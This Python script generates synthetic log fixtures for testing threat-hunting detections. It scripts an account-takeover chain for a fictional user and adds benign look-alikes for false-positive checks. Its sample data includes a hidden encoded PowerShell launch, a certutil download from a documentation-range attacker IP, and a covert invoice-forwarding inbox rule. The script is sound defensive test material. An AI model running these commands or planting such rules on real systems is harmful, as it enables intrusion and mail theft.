"""Generate the SYNTHETIC sample logs in data/samples/. Deterministic; no real data.

Scenario (all hosts/users/IPs are fictional; IPs are RFC 5737 documentation ranges):
  jkowalski : normal mornings in Warsaw, then password spraying -> MFA fatigue -> access from
              Brazil, malicious inbox rule + OAuth consent, suspicious commands on WS-JKOWALSKI.
  akowalska : benign look-alikes (forgotten password, flight Warsaw->London, admin tooling,
              newsletter inbox rule). Must NOT alert; used as false-positive fixtures.
  bkowalczyk: background noise.
"""

from __future__ import annotations

import base64
import json
from datetime import datetime, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "data" / "samples"
WAW = ("Warsaw", "PL", 52.2297, 21.0122)
LON = ("London", "GB", 51.5072, -0.1276)
SAO = ("Sao Paulo", "BR", -23.5505, -46.6333)
REASONS = {
    0: "Other.",
    50126: "Invalid username or password or Invalid on-premise username or password.",
    500121: "Authentication failed during strong authentication request.",
}


def t(day: int, hh: int, mm: int, ss: int = 0) -> datetime:
    return datetime(2026, 3, day, hh, mm, ss, tzinfo=timezone.utc)


def iso(d: datetime) -> str:
    return d.strftime("%Y-%m-%dT%H:%M:%SZ")


def entra(d, upn, ip, code, loc, app="Office 365 Exchange Online", client="Browser"):
    city, country, lat, lon = loc
    return {
        "createdDateTime": iso(d), "userPrincipalName": upn, "ipAddress": ip,
        "appDisplayName": app, "clientAppUsed": client,
        "status": {"errorCode": code, "failureReason": REASONS[code]},
        "location": {"city": city, "countryOrRegion": country,
                     "geoCoordinates": {"latitude": lat, "longitude": lon}},
    }


def ual(d, upn, ip, op, **params):
    return {"CreationTime": d.strftime("%Y-%m-%dT%H:%M:%S"), "Operation": op, "UserId": upn,
            "ClientIP": ip, "ResultStatus": "Succeeded",
            "Parameters": [{"Name": k, "Value": v} for k, v in params.items()]}


def win(d, host, user, event_id, cmd=None, image=None):
    rec = {"TimeCreated": iso(d), "EventID": event_id, "Computer": host, "User": user}
    if cmd:
        rec.update(CommandLine=cmd, Image=image)
    return rec


def build():
    entra_logs, ual_logs, win_logs = [], [], []
    J, A, B = "jkowalski@contoso.com", "akowalska@contoso.com", "bkowalczyk@contoso.com"
    CORP, ATT, UK = "192.0.2.10", "203.0.113.50", "198.51.100.77"

    for day in (9, 10, 11):
        entra_logs.append(entra(t(day, 7, 40), J, CORP, 0, WAW))
        entra_logs.append(entra(t(day, 8, 5), B, CORP, 0, WAW))
    entra_logs.append(entra(t(10, 14, 2), B, CORP, 0, WAW))

    # --- jkowalski: attack chain on 2026-03-11 ---
    for i in range(7):
        entra_logs.append(entra(t(11, 9, 20 + i, 10), J, ATT, 50126, SAO, client="IMAP4"))
    for i in range(6):
        entra_logs.append(entra(t(11, 9, 28 + 2 * i, 5), J, ATT, 500121, SAO))
    entra_logs.append(entra(t(11, 9, 41, 30), J, ATT, 0, SAO))
    ual_logs.append(ual(t(11, 9, 55, 12), J, ATT, "New-InboxRule", Name=".",
                        ForwardTo="archive.collector@mail-drop.test",
                        DeleteMessage="True", SubjectContainsWords="invoice;payment"))
    ual_logs.append(ual(t(11, 9, 58, 40), J, ATT, "Consent to application.",
                        AppName="PDF Converter Pro", Scope="Mail.ReadWrite offline_access User.Read"))
    ps = base64.b64encode("Write-Host 'hunterscope sample'".encode("utf-16-le")).decode()
    host, nt = "WS-JKOWALSKI.contoso.com", "CONTOSO\\jkowalski"
    pwsh = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    win_logs += [
        win(t(11, 10, 30, 5), host, nt, 1, f"powershell.exe -NoP -W Hidden -enc {ps}", pwsh),
        win(t(11, 10, 31, 12), host, nt, 1, "whoami /priv", "C:\\Windows\\System32\\whoami.exe"),
        win(t(11, 10, 33, 47), host, nt, 1,
            "certutil.exe -urlcache -split -f http://203.0.113.50/p.bin C:\\Users\\Public\\p.bin",
            "C:\\Windows\\System32\\certutil.exe"),
        win(t(11, 10, 40, 0), host, nt, 1, "notepad.exe C:\\Users\\jkowalski\\notes.txt", "C:\\Windows\\notepad.exe"),
    ]

    # --- akowalska: benign look-alikes ---
    entra_logs.append(entra(t(10, 8, 0), A, CORP, 0, WAW))
    entra_logs.append(entra(t(10, 15, 30), A, UK, 0, LON))          # ~193 km/h: a flight, not impossible
    for i in range(3):                                                # below threshold
        entra_logs.append(entra(t(11, 8, 1 + i, 0), A, UK, 50126, LON))
    entra_logs.append(entra(t(11, 8, 5, 0), A, UK, 0, LON))
    ual_logs.append(ual(t(11, 9, 0, 0), A, UK, "New-InboxRule", Name="Newsletters",
                        MoveToFolder="Newsletters", SubjectContainsWords="weekly digest"))
    win_logs += [
        win(t(11, 11, 0, 0), "WS-AKOWALSKA.contoso.com", "CONTOSO\\akowalska", 1,
            "certutil.exe -hashfile C:\\tools\\setup.exe SHA256", "C:\\Windows\\System32\\certutil.exe"),
        win(t(11, 11, 5, 0), "WS-AKOWALSKA.contoso.com", "CONTOSO\\akowalska", 1,
            "whoami", "C:\\Windows\\System32\\whoami.exe"),
    ]
    return entra_logs, ual_logs, win_logs


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    for name, rows in zip(("entra_signins", "ual_audit", "windows_sysmon"), build(), strict=True):
        rows.sort(key=lambda r: r.get("createdDateTime") or r.get("CreationTime") or r["TimeCreated"])
        (OUT / f"{name}.ndjson").write_text("\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8")


if __name__ == "__main__":
    main()
